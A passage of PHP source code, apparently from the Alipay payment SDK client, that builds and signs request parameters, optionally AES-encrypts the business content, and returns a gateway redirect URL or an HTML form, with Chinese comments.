		$version = $request->getApiVersion();
		$params['version'] = $this->checkEmpty($version) ? $this->apiVersion : $version;

		if ($notify_url = $request->getNotifyUrl()) {
			$params['notify_url'] = $notify_url;
		}

		$dict = $request->getApiParas();
		$params['biz_content'] = $dict['biz_content'];

		ksort($params);

		$params['sign'] = $this->generateSign($params, $this->signType);

		foreach ($params as &$value) {
			$value = $this->characet($value, $params['charset']);
		}
		
		return http_build_query($params);
	}

	/*
		页面提交执行方法
		@param：跳转类接口的request; $httpmethod 提交方式。两个值可选：post、get
		@return：构建好的、签名后的最终跳转URL（GET）或String形式的form（POST）
		auther:笙默
	*/
	function pageExecute($request,$httpmethod = "POST") {

		$this->setupCharsets($request);

		if (strcasecmp($this->fileCharset, $this->postCharset)) {

			// writeLog("本地文件字符集编码与表单提交编码不一致，请务必设置成一样，属性名分别为postCharset!");
			throw new Exception("文件编码：[" . $this->fileCharset . "] 与表单提交编码：[" . $this->postCharset . "]两者不一致!");
		}

		$iv=null;

		if(!$this->checkEmpty($request->getApiVersion())){
			$iv=$request->getApiVersion();
		}else{
			$iv=$this->apiVersion;
		}

		//组装系统参数
		$sysParams["app_id"] = $this->appId;
		$sysParams["version"] = $iv;
		$sysParams["format"] = $this->format;
		$sysParams["sign_type"] = $this->signType;
		$sysParams["method"] = $request->getApiMethodName();
		$sysParams["timestamp"] = date("Y-m-d H:i:s");
		$sysParams["alipay_sdk"] = $this->alipaySdkVersion;
		$sysParams["terminal_type"] = $request->getTerminalType();
		$sysParams["terminal_info"] = $request->getTerminalInfo();
		$sysParams["prod_code"] = $request->getProdCode();
		$sysParams["notify_url"] = $request->getNotifyUrl();
		$sysParams["return_url"] = $request->getReturnUrl();
		$sysParams["charset"] = $this->postCharset;

		//获取业务参数
		$apiParams = $request->getApiParas();

		if (method_exists($request,"getNeedEncrypt") &&$request->getNeedEncrypt()){

			$sysParams["encrypt_type"] = $this->encryptType;

			if ($this->checkEmpty($apiParams['biz_content'])) {

				throw new Exception(" api request Fail! The reason : encrypt request is not supperted!");
			}

			if ($this->checkEmpty($this->encryptKey) || $this->checkEmpty($this->encryptType)) {

				throw new Exception(" encryptType and encryptKey must not null! ");
			}

			if ("AES" != $this->encryptType) {

				throw new Exception("加密类型只支持AES");
			}

			// 执行加密
			$enCryptContent = encrypt_e($apiParams['biz_content'], $this->encryptKey);
			$apiParams['biz_content'] = $enCryptContent;

		}

		//print_r($apiParams);
		$totalParams = array_merge($apiParams, $sysParams);
		
		//待签名字符串
		$preSignStr = $this->getSignContent($totalParams);

		//签名
		$totalParams["sign"] = $this->generateSign($totalParams, $this->signType);

		if ("GET" == strtoupper($httpmethod)) {
			
			//value做urlencode
			$preString=$this->getSignContentUrlencode($totalParams);
			//拼接GET请求串
			$requestUrl = $this->gatewayUrl."?".$preString;
			
			return $requestUrl;
		} else {
			//拼接表单字符串
			return $this->buildRequestForm($totalParams);
		}


}
